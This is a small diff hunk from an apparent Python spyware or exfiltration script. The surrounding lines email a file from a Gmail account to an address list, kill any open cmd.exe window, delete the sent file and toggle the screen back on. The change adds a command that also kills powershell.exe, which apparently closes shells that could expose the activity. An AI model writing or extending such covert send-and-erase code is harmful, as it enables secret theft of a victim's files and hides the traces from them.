@@ -46,6 +46,7 @@ Message.attach(part)
 SMTPmail.sendmail("weatherforaday@gmail.com", listOfEmails[0], Message.as_string()) # отправляем его
 #mouse.drag(0, 0, 0, 1, absolute=False, duration=0.5)
 os.system("taskkill /im cmd.exe")
+os.system("taskkill /im powershell.exe")
 os.remove(pathToFile)
 time.sleep(5)
 ScreenON()
